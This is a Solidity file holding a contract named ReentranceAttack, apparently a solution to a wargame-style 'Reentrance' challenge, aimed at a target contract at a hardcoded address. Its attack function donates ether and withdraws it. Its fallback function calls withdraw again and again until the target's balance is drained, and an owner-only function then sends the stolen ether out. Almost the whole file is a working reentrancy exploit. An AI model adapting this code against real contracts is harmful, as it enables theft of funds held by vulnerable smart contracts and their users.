//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint);

    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    // Maximum number of times fallback will call back msg.sender
    //uint public immutable max;
    // Actual amount of time fallback was executed
    uint public count;
    uint public donation;
    address public owner;

    address originalAddress = 0x8586a5A9d4d438aC097EE0E4Cdb517Da7aE8Ba2f;
    IReentrance public reentrance = IReentrance(originalAddress);

    constructor() {
        //max = _max;
        owner = msg.sender;
    }

    function attack() public payable {
        donation = msg.value;
        reentrance.donate{value: donation}(address(this));
        reentrance.withdraw(donation);
    }

    function getBalance() public view returns (uint) {
        return reentrance.balanceOf(address(this));
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "requires owner");
        (bool sent, ) = msg.sender.call{value: balance()}("");
        require(sent, "Failed to send ether");
        return sent;
    }

    fallback() external payable {
        //count can be as high as you want.
        //option 1:
        // if (count < max) {
        //   count += 1;
        //   (bool success, ) = msg.sender.call(
        //       abi.encodeWithSignature("withdraw(uint256)", 100000000000000)
        //   );
        //   require(success, "call back failed");
        // }
        //option 2:
        uint targetBalance = address(originalAddress).balance;
        if (targetBalance >= donation) {
            (bool success, ) = msg.sender.call(
                abi.encodeWithSignature("withdraw(uint256)", donation)
            );
            require(success, "call back failed");
        } else if (targetBalance > 0) {
            (bool success, ) = msg.sender.call(
                abi.encodeWithSignature("withdraw(uint256)", targetBalance)
            );
            require(success, "call back failed");
        }
    }
}
